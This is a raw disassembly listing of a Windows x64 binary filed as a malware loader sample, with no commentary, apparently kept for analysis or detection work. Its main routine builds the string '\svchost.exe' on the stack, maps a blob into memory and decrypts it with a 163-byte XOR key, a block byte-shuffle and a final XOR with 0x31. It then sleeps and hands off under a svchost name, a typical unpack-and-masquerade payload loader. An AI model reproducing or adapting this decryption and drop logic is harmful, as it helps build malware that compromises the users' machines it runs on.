
malware_samples/loader/76d6b638a9a22dce8edab0145fcdb09adb986fb98222fab0127df60c2fed8112.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 0d e9 22 03 00 	lea    0x322e9(%rip),%rcx        # 0x1800332f0
   180001007:	e9 2c bc 00 00       	jmp    0x18000cc38
   18000100c:	48 83 ec 28          	sub    $0x28,%rsp
   180001010:	48 8d 0d f9 99 04 00 	lea    0x499f9(%rip),%rcx        # 0x18004aa10
   180001017:	e8 84 c4 00 00       	call   0x18000d4a0
   18000101c:	48 8d 0d 39 23 03 00 	lea    0x32339(%rip),%rcx        # 0x18003335c
   180001023:	48 83 c4 28          	add    $0x28,%rsp
   180001027:	e9 0c bc 00 00       	jmp    0x18000cc38
   18000102c:	48 8d 0d 91 23 03 00 	lea    0x32391(%rip),%rcx        # 0x1800333c4
   180001033:	e9 00 bc 00 00       	jmp    0x18000cc38
   180001038:	48 8d 0d 29 23 03 00 	lea    0x32329(%rip),%rcx        # 0x180033368
   18000103f:	e9 f4 bb 00 00       	jmp    0x18000cc38
   180001044:	48 83 ec 28          	sub    $0x28,%rsp
   180001048:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000104e:	48 8d 15 fb 9b 04 00 	lea    0x49bfb(%rip),%rdx        # 0x18004ac50
   180001055:	45 33 c0             	xor    %r8d,%r8d
   180001058:	48 8d 0d 81 9b 04 00 	lea    0x49b81(%rip),%rcx        # 0x18004abe0
   18000105f:	e8 0c 7b 00 00       	call   0x180008b70
   180001064:	48 8d 0d 99 23 03 00 	lea    0x32399(%rip),%rcx        # 0x180033404
   18000106b:	48 83 c4 28          	add    $0x28,%rsp
   18000106f:	e9 c4 bb 00 00       	jmp    0x18000cc38
   180001074:	40 53                	rex push %rbx
   180001076:	48 83 ec 20          	sub    $0x20,%rsp
   18000107a:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000107f:	e8 d4 2c 01 00       	call   0x180013d58
   180001084:	48 8d 0d c5 9b 04 00 	lea    0x49bc5(%rip),%rcx        # 0x18004ac50
   18000108b:	48 8b d8             	mov    %rax,%rbx
   18000108e:	e8 3d 7e 00 00       	call   0x180008ed0
   180001093:	48 8d 05 16 37 03 00 	lea    0x33716(%rip),%rax        # 0x1800347b0
   18000109a:	45 33 c0             	xor    %r8d,%r8d
   18000109d:	48 8b d3             	mov    %rbx,%rdx
   1800010a0:	48 89 05 a9 9b 04 00 	mov    %rax,0x49ba9(%rip)        # 0x18004ac50
   1800010a7:	48 8d 0d a2 9b 04 00 	lea    0x49ba2(%rip),%rcx        # 0x18004ac50
   1800010ae:	e8 bd 78 00 00       	call   0x180008970
   1800010b3:	48 8d 0d 9e 23 03 00 	lea    0x3239e(%rip),%rcx        # 0x180033458
   1800010ba:	48 83 c4 20          	add    $0x20,%rsp
   1800010be:	5b                   	pop    %rbx
   1800010bf:	e9 74 bb 00 00       	jmp    0x18000cc38
   1800010c4:	48 8b 05 15 9b 04 00 	mov    0x49b15(%rip),%rax        # 0x18004abe0
   1800010cb:	48 8d 15 0e 9b 04 00 	lea    0x49b0e(%rip),%rdx        # 0x18004abe0
   1800010d2:	48 89 15 b7 9c 04 00 	mov    %rdx,0x49cb7(%rip)        # 0x18004ad90
   1800010d9:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800010dd:	48 8b 05 a4 9c 04 00 	mov    0x49ca4(%rip),%rax        # 0x18004ad88
   1800010e4:	48 89 44 11 50       	mov    %rax,0x50(%rcx,%rdx,1)
   1800010e9:	48 8b 05 f0 9a 04 00 	mov    0x49af0(%rip),%rax        # 0x18004abe0
   1800010f0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1800010f4:	83 4c 11 18 02       	orl    $0x2,0x18(%rcx,%rdx,1)
   1800010f9:	c3                   	ret
   1800010fa:	cc                   	int3
   1800010fb:	cc                   	int3
   1800010fc:	48 83 ec 28          	sub    $0x28,%rsp
   180001100:	48 8d 0d c9 9a 04 00 	lea    0x49ac9(%rip),%rcx        # 0x18004abd0
   180001107:	e8 94 c3 00 00       	call   0x18000d4a0
   18000110c:	48 8d 0d 51 23 03 00 	lea    0x32351(%rip),%rcx        # 0x180033464
   180001113:	48 83 c4 28          	add    $0x28,%rsp
   180001117:	e9 1c bb 00 00       	jmp    0x18000cc38
   18000111c:	48 83 ec 28          	sub    $0x28,%rsp
   180001120:	48 8d 0d 99 9c 04 00 	lea    0x49c99(%rip),%rcx        # 0x18004adc0
   180001127:	e8 74 c3 00 00       	call   0x18000d4a0
   18000112c:	48 8d 0d 7d 23 03 00 	lea    0x3237d(%rip),%rcx        # 0x1800334b0
   180001133:	48 83 c4 28          	add    $0x28,%rsp
   180001137:	e9 fc ba 00 00       	jmp    0x18000cc38
   18000113c:	48 8d 0d 2d 23 03 00 	lea    0x3232d(%rip),%rcx        # 0x180033470
   180001143:	e9 f0 ba 00 00       	jmp    0x18000cc38
   180001148:	cc                   	int3
   180001149:	cc                   	int3
   18000114a:	cc                   	int3
   18000114b:	cc                   	int3
   18000114c:	cc                   	int3
   18000114d:	cc                   	int3
   18000114e:	cc                   	int3
   18000114f:	cc                   	int3
   180001150:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001155:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000115a:	55                   	push   %rbp
   18000115b:	57                   	push   %rdi
   18000115c:	41 56                	push   %r14
   18000115e:	48 8d ac 24 d0 fe ff 	lea    -0x130(%rsp),%rbp
   180001165:	ff 
   180001166:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   18000116d:	48 8b 05 9c 7e 04 00 	mov    0x47e9c(%rip),%rax        # 0x180049010
   180001174:	48 33 c4             	xor    %rsp,%rax
   180001177:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   18000117e:	33 ff                	xor    %edi,%edi
   180001180:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180001184:	33 d2                	xor    %edx,%edx
   180001186:	89 7d 00             	mov    %edi,0x0(%rbp)
   180001189:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000118f:	e8 7c e5 00 00       	call   0x18000f710
   180001194:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   180001199:	44 8d 47 03          	lea    0x3(%rdi),%r8d
   18000119d:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1800011a4:	00 
   1800011a5:	48 8d 0d 74 aa 04 00 	lea    0x4aa74(%rip),%rcx        # 0x18004bc20
   1800011ac:	45 33 c9             	xor    %r9d,%r9d
   1800011af:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   1800011b6:	00 
   1800011b7:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   1800011bc:	c7 44 24 40 5c 73 76 	movl   $0x6376735c,0x40(%rsp)
   1800011c3:	63 
   1800011c4:	c7 44 24 44 68 6f 73 	movl   $0x74736f68,0x44(%rsp)
   1800011cb:	74 
   1800011cc:	c7 44 24 48 2e 65 78 	movl   $0x6578652e,0x48(%rsp)
   1800011d3:	65 
   1800011d4:	40 88 7c 24 4c       	mov    %dil,0x4c(%rsp)
   1800011d9:	c7 44 24 50 55 56 59 	movl   $0x28595655,0x50(%rsp)
   1800011e0:	28 
   1800011e1:	c7 44 24 54 57 5b 3a 	movl   $0x593a5b57,0x54(%rsp)
   1800011e8:	59 
   1800011e9:	c7 44 24 58 21 55 54 	movl   $0x4a545521,0x58(%rsp)
   1800011f0:	4a 
   1800011f1:	c7 44 24 5c 2d 4e 26 	movl   $0x21264e2d,0x5c(%rsp)
   1800011f8:	21 
   1800011f9:	c7 44 24 60 5a 5b 53 	movl   $0x3e535b5a,0x60(%rsp)
   180001200:	3e 
   180001201:	c7 44 24 64 47 40 2e 	movl   $0x2b2e4047,0x64(%rsp)
   180001208:	2b 
   180001209:	c7 44 24 68 36 2f 57 	movl   $0x46572f36,0x68(%rsp)
   180001210:	46 
   180001211:	c7 44 24 6c 3e 29 22 	movl   $0x5622293e,0x6c(%rsp)
   180001218:	56 
   180001219:	c7 44 24 70 28 4a 36 	movl   $0x3f364a28,0x70(%rsp)
   180001220:	3f 
   180001221:	c7 44 24 74 24 51 55 	movl   $0x53555124,0x74(%rsp)
   180001228:	53 
   180001229:	c7 44 24 78 24 47 3c 	movl   $0x3c3c4724,0x78(%rsp)
   180001230:	3c 
   180001231:	c7 44 24 7c 4c 50 3a 	movl   $0x463a504c,0x7c(%rsp)
   180001238:	46 
   180001239:	c7 45 80 2a 58 52 58 	movl   $0x5852582a,-0x80(%rbp)
   180001240:	c7 45 84 20 42 5c 34 	movl   $0x345c4220,-0x7c(%rbp)
   180001247:	c7 45 88 48 4e 4f 48 	movl   $0x484f4e48,-0x78(%rbp)
   18000124e:	c7 45 8c 24 52 3b 55 	movl   $0x553b5224,-0x74(%rbp)
   180001255:	c7 45 90 53 5b 41 40 	movl   $0x40415b53,-0x70(%rbp)
   18000125c:	c7 45 94 37 45 5a 29 	movl   $0x295a4537,-0x6c(%rbp)
   180001263:	c7 45 98 25 5d 39 5d 	movl   $0x5d395d25,-0x68(%rbp)
   18000126a:	c7 45 9c 23 4f 3d 43 	movl   $0x433d4f23,-0x64(%rbp)
   180001271:	c7 45 a0 53 30 3c 44 	movl   $0x443c3053,-0x60(%rbp)
   180001278:	c7 45 a4 35 27 56 44 	movl   $0x44562735,-0x5c(%rbp)
   18000127f:	c7 45 a8 4b 22 54 34 	movl   $0x3454224b,-0x58(%rbp)
   180001286:	c7 45 ac 21 2d 4f 30 	movl   $0x304f2d21,-0x54(%rbp)
   18000128d:	c7 45 b0 2c 45 47 4e 	movl   $0x4e47452c,-0x50(%rbp)
   180001294:	c7 45 b4 2e 57 2e 42 	movl   $0x422e572e,-0x4c(%rbp)
   18000129b:	c7 45 b8 5b 48 52 20 	movl   $0x2052485b,-0x48(%rbp)
   1800012a2:	c7 45 bc 28 5d 30 57 	movl   $0x57305d28,-0x44(%rbp)
   1800012a9:	c7 45 c0 31 2b 52 51 	movl   $0x51522b31,-0x40(%rbp)
   1800012b0:	c7 45 c4 36 54 40 4b 	movl   $0x4b405436,-0x3c(%rbp)
   1800012b7:	c7 45 c8 25 5b 52 35 	movl   $0x35525b25,-0x38(%rbp)
   1800012be:	c7 45 cc 4f 45 28 56 	movl   $0x5628454f,-0x34(%rbp)
   1800012c5:	c7 45 d0 2e 29 50 3c 	movl   $0x3c50292e,-0x30(%rbp)
   1800012cc:	c7 45 d4 28 4c 34 59 	movl   $0x59344c28,-0x2c(%rbp)
   1800012d3:	c7 45 d8 21 57 46 4a 	movl   $0x4a465721,-0x28(%rbp)
   1800012da:	c7 45 dc 32 55 3b 4b 	movl   $0x4b3b5532,-0x24(%rbp)
   1800012e1:	c7 45 e0 4f 5b 23 53 	movl   $0x53235b4f,-0x20(%rbp)
   1800012e8:	c7 45 e4 38 5b 57 36 	movl   $0x36575b38,-0x1c(%rbp)
   1800012ef:	c7 45 e8 24 59 49 31 	movl   $0x31495924,-0x18(%rbp)
   1800012f6:	c7 45 ec 24 57 51 35 	movl   $0x35515724,-0x14(%rbp)
   1800012fd:	66 c7 45 f0 40 5a    	movw   $0x5a40,-0x10(%rbp)
   180001303:	c6 45 f2 50          	movb   $0x50,-0xe(%rbp)
   180001307:	ff 15 f3 2d 03 00    	call   *0x32df3(%rip)        # 0x180034100
   18000130d:	48 8b c8             	mov    %rax,%rcx
   180001310:	33 d2                	xor    %edx,%edx
   180001312:	4c 8b f0             	mov    %rax,%r14
   180001315:	ff 15 75 2d 03 00    	call   *0x32d75(%rip)        # 0x180034090
   18000131b:	8b 55 00             	mov    0x0(%rbp),%edx
   18000131e:	8b cf                	mov    %edi,%ecx
   180001320:	89 05 e6 a8 04 00    	mov    %eax,0x4a8e6(%rip)        # 0x18004bc0c
   180001326:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000132d:	00 00 00 
   180001330:	8d 14 4a             	lea    (%rdx,%rcx,2),%edx
   180001333:	83 c1 02             	add    $0x2,%ecx
   180001336:	8d 52 01             	lea    0x1(%rdx),%edx
   180001339:	81 f9 e8 03 00 00    	cmp    $0x3e8,%ecx
   18000133f:	7c ef                	jl     0x180001330
   180001341:	45 33 c9             	xor    %r9d,%r9d
   180001344:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   180001349:	33 d2                	xor    %edx,%edx
   18000134b:	89 7d 00             	mov    %edi,0x0(%rbp)
   18000134e:	49 8b ce             	mov    %r14,%rcx
   180001351:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   180001355:	45 8d 41 04          	lea    0x4(%r9),%r8d
   180001359:	ff 15 29 2d 03 00    	call   *0x32d29(%rip)        # 0x180034088
   18000135f:	8b 0d a7 a8 04 00    	mov    0x4a8a7(%rip),%ecx        # 0x18004bc0c
   180001365:	48 8b f0             	mov    %rax,%rsi
   180001368:	83 c1 44             	add    $0x44,%ecx
   18000136b:	48 63 d9             	movslq %ecx,%rbx
   18000136e:	ff 15 2c 2d 03 00    	call   *0x32d2c(%rip)        # 0x1800340a0
   180001374:	4c 8b c3             	mov    %rbx,%r8
   180001377:	ba 08 00 00 00       	mov    $0x8,%edx
   18000137c:	48 8b c8             	mov    %rax,%rcx
   18000137f:	ff 15 eb 2c 03 00    	call   *0x32ceb(%rip)        # 0x180034070
   180001385:	48 89 05 8c a8 04 00 	mov    %rax,0x4a88c(%rip)        # 0x18004bc18
   18000138c:	48 85 f6             	test   %rsi,%rsi
   18000138f:	75 25                	jne    0x1800013b6
   180001391:	8b 45 00             	mov    0x0(%rbp),%eax
   180001394:	0f 1f 40 00          	nopl   0x0(%rax)
   180001398:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000139f:	00 
   1800013a0:	8d 04 78             	lea    (%rax,%rdi,2),%eax
   1800013a3:	83 c7 02             	add    $0x2,%edi
   1800013a6:	ff c0                	inc    %eax
   1800013a8:	81 ff 10 27 00 00    	cmp    $0x2710,%edi
   1800013ae:	0f 8d 3a 02 00 00    	jge    0x1800015ee
   1800013b4:	eb ea                	jmp    0x1800013a0
   1800013b6:	45 33 c9             	xor    %r9d,%r9d
   1800013b9:	4c 89 bc 24 50 02 00 	mov    %r15,0x250(%rsp)
   1800013c0:	00 
   1800013c1:	45 33 c0             	xor    %r8d,%r8d
   1800013c4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800013c9:	48 8b ce             	mov    %rsi,%rcx
   1800013cc:	41 8d 51 04          	lea    0x4(%r9),%edx
   1800013d0:	ff 15 ea 2c 03 00    	call   *0x32cea(%rip)        # 0x1800340c0
   1800013d6:	8b 0d 30 a8 04 00    	mov    0x4a830(%rip),%ecx        # 0x18004bc0c
   1800013dc:	4c 8d 4d 00          	lea    0x0(%rbp),%r9
   1800013e0:	83 c1 44             	add    $0x44,%ecx
   1800013e3:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1800013e9:	48 63 d1             	movslq %ecx,%rdx
   1800013ec:	4c 8b f8             	mov    %rax,%r15
   1800013ef:	48 8b 0d 22 a8 04 00 	mov    0x4a822(%rip),%rcx        # 0x18004bc18
   1800013f6:	ff 15 34 2d 03 00    	call   *0x32d34(%rip)        # 0x180034130
   1800013fc:	8b 35 0a a8 04 00    	mov    0x4a80a(%rip),%esi        # 0x18004bc0c
   180001402:	49 8b d7             	mov    %r15,%rdx
   180001405:	48 8b 1d 0c a8 04 00 	mov    0x4a80c(%rip),%rbx        # 0x18004bc18
   18000140c:	8d 4e 01             	lea    0x1(%rsi),%ecx
   18000140f:	4c 63 c1             	movslq %ecx,%r8
   180001412:	48 8b cb             	mov    %rbx,%rcx
   180001415:	e8 16 e5 00 00       	call   0x18000f930
   18000141a:	85 f6                	test   %esi,%esi
   18000141c:	7e 3e                	jle    0x18000145c
   18000141e:	44 8b c6             	mov    %esi,%r8d
   180001421:	49 b9 ad 46 11 87 4e 	movabs $0xc907da4e871146ad,%r9
   180001428:	da 07 c9 
   18000142b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001430:	48 8b cf             	mov    %rdi,%rcx
   180001433:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   180001437:	49 8b c1             	mov    %r9,%rax
   18000143a:	48 f7 e7             	mul    %rdi
   18000143d:	48 ff c7             	inc    %rdi
   180001440:	48 c1 ea 07          	shr    $0x7,%rdx
   180001444:	48 69 c2 a3 00 00 00 	imul   $0xa3,%rdx,%rax
   18000144b:	48 2b c8             	sub    %rax,%rcx
   18000144e:	0f b6 44 0c 50       	movzbl 0x50(%rsp,%rcx,1),%eax
   180001453:	30 43 ff             	xor    %al,-0x1(%rbx)
   180001456:	49 83 e8 01          	sub    $0x1,%r8
   18000145a:	75 d4                	jne    0x180001430
   18000145c:	49 8b ce             	mov    %r14,%rcx
   18000145f:	ff 15 fb 2b 03 00    	call   *0x32bfb(%rip)        # 0x180034060
   180001465:	b8 67 66 66 66       	mov    $0x66666667,%eax
   18000146a:	f7 2d 9c a7 04 00    	imull  0x4a79c(%rip)        # 0x18004bc0c
   180001470:	c1 fa 02             	sar    $0x2,%edx
   180001473:	8b c2                	mov    %edx,%eax
   180001475:	c1 e8 1f             	shr    $0x1f,%eax
   180001478:	03 d0                	add    %eax,%edx
   18000147a:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000147d:	03 c0                	add    %eax,%eax
   18000147f:	48 63 c8             	movslq %eax,%rcx
   180001482:	85 c0                	test   %eax,%eax
   180001484:	0f 8e 88 00 00 00    	jle    0x180001512
   18000148a:	4c 8b 1d 87 a7 04 00 	mov    0x4a787(%rip),%r11        # 0x18004bc18
   180001491:	48 b8 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rax
   180001498:	cc cc cc 
   18000149b:	49 83 c3 02          	add    $0x2,%r11
   18000149f:	48 ff c9             	dec    %rcx
   1800014a2:	48 f7 e1             	mul    %rcx
   1800014a5:	48 8b da             	mov    %rdx,%rbx
   1800014a8:	48 c1 eb 03          	shr    $0x3,%rbx
   1800014ac:	48 ff c3             	inc    %rbx
   1800014af:	90                   	nop
   1800014b0:	41 0f b6 43 03       	movzbl 0x3(%r11),%eax
   1800014b5:	45 0f b6 53 fe       	movzbl -0x2(%r11),%r10d
   1800014ba:	41 88 43 fe          	mov    %al,-0x2(%r11)
   1800014be:	41 0f b6 43 04       	movzbl 0x4(%r11),%eax
   1800014c3:	45 0f b6 4b ff       	movzbl -0x1(%r11),%r9d
   1800014c8:	41 88 43 ff          	mov    %al,-0x1(%r11)
   1800014cc:	41 0f b6 43 05       	movzbl 0x5(%r11),%eax
   1800014d1:	45 0f b6 03          	movzbl (%r11),%r8d
   1800014d5:	41 88 03             	mov    %al,(%r11)
   1800014d8:	41 0f b6 43 06       	movzbl 0x6(%r11),%eax
   1800014dd:	41 0f b6 53 01       	movzbl 0x1(%r11),%edx
   1800014e2:	41 88 43 01          	mov    %al,0x1(%r11)
   1800014e6:	41 0f b6 43 07       	movzbl 0x7(%r11),%eax
   1800014eb:	41 0f b6 4b 02       	movzbl 0x2(%r11),%ecx
   1800014f0:	41 88 43 02          	mov    %al,0x2(%r11)
   1800014f4:	45 88 53 03          	mov    %r10b,0x3(%r11)
   1800014f8:	45 88 4b 04          	mov    %r9b,0x4(%r11)
   1800014fc:	45 88 43 05          	mov    %r8b,0x5(%r11)
   180001500:	41 88 53 06          	mov    %dl,0x6(%r11)
   180001504:	41 88 4b 07          	mov    %cl,0x7(%r11)
   180001508:	4d 8d 5b 0a          	lea    0xa(%r11),%r11
   18000150c:	48 83 eb 01          	sub    $0x1,%rbx
   180001510:	75 9e                	jne    0x1800014b0
   180001512:	49 8b cf             	mov    %r15,%rcx
   180001515:	ff 15 05 2c 03 00    	call   *0x32c05(%rip)        # 0x180034120
   18000151b:	8b 0d eb a6 04 00    	mov    0x4a6eb(%rip),%ecx        # 0x18004bc0c
   180001521:	4c 8b bc 24 50 02 00 	mov    0x250(%rsp),%r15
   180001528:	00 
   180001529:	85 c9                	test   %ecx,%ecx
   18000152b:	7e 20                	jle    0x18000154d
   18000152d:	48 8b 05 e4 a6 04 00 	mov    0x4a6e4(%rip),%rax        # 0x18004bc18
   180001534:	0f 1f 40 00          	nopl   0x0(%rax)
   180001538:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000153f:	00 
   180001540:	80 30 31             	xorb   $0x31,(%rax)
   180001543:	48 8d 40 01          	lea    0x1(%rax),%rax
   180001547:	48 83 e9 01          	sub    $0x1,%rcx
   18000154b:	75 f3                	jne    0x180001540
   18000154d:	b9 eb 01 00 00       	mov    $0x1eb,%ecx
   180001552:	ff 15 b0 2b 03 00    	call   *0x32bb0(%rip)        # 0x180034108
   180001558:	ba 04 01 00 00       	mov    $0x104,%edx
   18000155d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180001561:	ff 15 51 2b 03 00    	call   *0x32b51(%rip)        # 0x1800340b8
   180001567:	48 8d 55 10          	lea    0x10(%rbp),%rdx
   18000156b:	48 ff ca             	dec    %rdx
   18000156e:	66 90                	xchg   %ax,%ax
   180001570:	80 7a 01 00          	cmpb   $0x0,0x1(%rdx)
   180001574:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001578:	75 f6                	jne    0x180001570
   18000157a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   18000157f:	45 33 c0             	xor    %r8d,%r8d
   180001582:	0f 1f 40 00          	nopl   0x0(%rax)
   180001586:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000158d:	00 00 00 
   180001590:	43 0f b6 04 01       	movzbl (%r9,%r8,1),%eax
   180001595:	42 88 04 02          	mov    %al,(%rdx,%r8,1)
   180001599:	4d 8d 40 01          	lea    0x1(%r8),%r8
   18000159d:	84 c0                	test   %al,%al
   18000159f:	75 ef                	jne    0x180001590
   1800015a1:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800015a5:	e8 a6 05 00 00       	call   0x180001b50
   1800015aa:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1800015af:	ff 15 53 2b 03 00    	call   *0x32b53(%rip)        # 0x180034108
   1800015b5:	48 8b 0d 6c aa 04 00 	mov    0x4aa6c(%rip),%rcx        # 0x18004c028
   1800015bc:	ff 15 36 2b 03 00    	call   *0x32b36(%rip)        # 0x1800340f8
   1800015c2:	b8 01 00 00 00       	mov    $0x1,%eax
   1800015c7:	48 8b 8d 20 01 00 00 	mov    0x120(%rbp),%rcx
   1800015ce:	48 33 cc             	xor    %rsp,%rcx
   1800015d1:	e8 fa af 00 00       	call   0x18000c5d0
   1800015d6:	4c 8d 9c 24 30 02 00 	lea    0x230(%rsp),%r11
   1800015dd:	00 
   1800015de:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   1800015e2:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1800015e6:	49 8b e3             	mov    %r11,%rsp
   1800015e9:	41 5e                	pop    %r14
   1800015eb:	5f                   	pop    %rdi
   1800015ec:	5d                   	pop    %rbp
   1800015ed:	c3                   	ret
   1800015ee:	33 c9                	xor    %ecx,%ecx
   1800015f0:	89 45 00             	mov    %eax,0x0(%rbp)
   1800015f3:	e8 f8 24 01 00       	call   0x180013af0
   1800015f8:	cc                   	int3
   1800015f9:	cc                   	int3
   1800015fa:	cc                   	int3
   1800015fb:	cc                   	int3
   1800015fc:	cc                   	int3
   1800015fd:	cc                   	int3
   1800015fe:	cc                   	int3
   1800015ff:	cc                   	int3
   180001600:	83 e9 01             	sub    $0x1,%ecx
   180001603:	74 22                	je     0x180001627
   180001605:	83 e9 01             	sub    $0x1,%ecx
   180001608:	74 11                	je     0x18000161b
   18000160a:	83 f9 01             	cmp    $0x1,%ecx
   18000160d:	75 46                	jne    0x180001655
   18000160f:	c7 05 db a5 04 00 04 	movl   $0x4,0x4a5db(%rip)        # 0x18004bbf4
   180001616:	00 00 00 
   180001619:	eb 25                	jmp    0x180001640
   18000161b:	c7 05 cf a5 04 00 07 	movl   $0x7,0x4a5cf(%rip)        # 0x18004bbf4
   180001622:	00 00 00 
   180001625:	eb 19                	jmp    0x180001640
   180001627:	33 c0                	xor    %eax,%eax
   180001629:	c7 05 c1 a5 04 00 01 	movl   $0x1,0x4a5c1(%rip)        # 0x18004bbf4
   180001630:	00 00 00 
   180001633:	89 05 c3 a5 04 00    	mov    %eax,0x4a5c3(%rip)        # 0x18004bbfc
   180001639:	48 89 05 c4 a5 04 00 	mov    %rax,0x4a5c4(%rip)        # 0x18004bc04
   180001640:	48 8b 0d d9 a9 04 00 	mov    0x4a9d9(%rip),%rcx        # 0x18004c020
   180001647:	48 8d 15 a2 a5 04 00 	lea    0x4a5a2(%rip),%rdx        # 0x18004bbf0
   18000164e:	48 ff 25 ab 29 03 00 	rex.W jmp *0x329ab(%rip)        # 0x180034000
   180001655:	c3                   	ret
   180001656:	cc                   	int3
   180001657:	cc                   	int3
   180001658:	cc                   	int3
   180001659:	cc                   	int3
   18000165a:	cc                   	int3
   18000165b:	cc                   	int3
   18000165c:	cc                   	int3
   18000165d:	cc                   	int3
   18000165e:	cc                   	int3
   18000165f:	cc                   	int3
   180001660:	40 53                	rex push %rbx
   180001662:	48 83 ec 20          	sub    $0x20,%rsp
   180001666:	33 db                	xor    %ebx,%ebx
   180001668:	c7 05 7e a5 04 00 30 	movl   $0x30,0x4a57e(%rip)        # 0x18004bbf0
   18000166f:	00 00 00 
   180001672:	48 8d 15 87 ff ff ff 	lea    -0x79(%rip),%rdx        # 0x180001600
   180001679:	48 89 1d 80 a5 04 00 	mov    %rbx,0x4a580(%rip)        # 0x18004bc00
   180001680:	48 8d 0d 21 13 04 00 	lea    0x41321(%rip),%rcx        # 0x1800429a8
   180001687:	89 1d 7b a5 04 00    	mov    %ebx,0x4a57b(%rip)        # 0x18004bc08
   18000168d:	c7 05 5d a5 04 00 02 	movl   $0x2,0x4a55d(%rip)        # 0x18004bbf4
   180001694:	00 00 00 
   180001697:	48 c7 05 56 a5 04 00 	movq   $0x1,0x4a556(%rip)        # 0x18004bbf8
   18000169e:	01 00 00 00 
   1800016a2:	ff 15 88 29 03 00    	call   *0x32988(%rip)        # 0x180034030
   1800016a8:	48 89 05 71 a9 04 00 	mov    %rax,0x4a971(%rip)        # 0x18004c020
   1800016af:	48 85 c0             	test   %rax,%rax
   1800016b2:	75 06                	jne    0x1800016ba
   1800016b4:	48 83 c4 20          	add    $0x20,%rsp
   1800016b8:	5b                   	pop    %rbx
   1800016b9:	c3                   	ret
   1800016ba:	48 8d 15 2f a5 04 00 	lea    0x4a52f(%rip),%rdx        # 0x18004bbf0
   1800016c1:	48 8b c8             	mov    %rax,%rcx
   1800016c4:	ff 15 36 29 03 00    	call   *0x32936(%rip)        # 0x180034000
   1800016ca:	48 8b 0d 4f a9 04 00 	mov    0x4a94f(%rip),%rcx        # 0x18004c020
   1800016d1:	48 8d 15 18 a5 04 00 	lea    0x4a518(%rip),%rdx        # 0x18004bbf0
   1800016d8:	c7 05 12 a5 04 00 04 	movl   $0x4,0x4a512(%rip)        # 0x18004bbf4
   1800016df:	00 00 00 
   1800016e2:	48 89 1d 1b a5 04 00 	mov    %rbx,0x4a51b(%rip)        # 0x18004bc04
   1800016e9:	ff 15 11 29 03 00    	call   *0x32911(%rip)        # 0x180034000
   1800016ef:	e8 bc 02 00 00       	call   0x1800019b0
   1800016f4:	cc                   	int3
   1800016f5:	cc                   	int3
   1800016f6:	cc                   	int3
   1800016f7:	cc                   	int3
   1800016f8:	cc                   	int3
   1800016f9:	cc                   	int3
   1800016fa:	cc                   	int3
   1800016fb:	cc                   	int3
   1800016fc:	cc                   	int3
   1800016fd:	cc                   	int3
   1800016fe:	cc                   	int3
   1800016ff:	cc                   	int3
   180001700:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001705:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000170a:	56                   	push   %rsi
   18000170b:	b8 80 10 00 00       	mov    $0x1080,%eax
   180001710:	e8 9b 06 03 00       	call   0x180031db0
   180001715:	48 2b e0             	sub    %rax,%rsp
   180001718:	48 8b 05 f1 78 04 00 	mov    0x478f1(%rip),%rax        # 0x180049010
   18000171f:	48 33 c4             	xor    %rsp,%rax
   180001722:	48 89 84 24 70 10 00 	mov    %rax,0x1070(%rsp)
   180001729:	00 
   18000172a:	33 d2                	xor    %edx,%edx
   18000172c:	48 8d 8c 24 a0 08 00 	lea    0x8a0(%rsp),%rcx
   180001733:	00 
   180001734:	41 b8 d0 07 00 00    	mov    $0x7d0,%r8d
   18000173a:	e8 d1 df 00 00       	call   0x18000f710
   18000173f:	33 d2                	xor    %edx,%edx
   180001741:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
   180001748:	00 
   180001749:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   18000174f:	e8 bc df 00 00       	call   0x18000f710
   180001754:	33 f6                	xor    %esi,%esi
   180001756:	48 8d 1d c3 a4 04 00 	lea    0x4a4c3(%rip),%rbx        # 0x18004bc20
   18000175d:	48 8d 2d 44 12 04 00 	lea    0x41244(%rip),%rbp        # 0x1800429a8
   180001764:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   18000176b:	00 
   18000176c:	48 8b d3             	mov    %rbx,%rdx
   18000176f:	48 89 6c 24 78       	mov    %rbp,0x78(%rsp)
   180001774:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   18000177a:	48 89 b4 24 90 00 00 	mov    %rsi,0x90(%rsp)
   180001781:	00 
   180001782:	33 c9                	xor    %ecx,%ecx
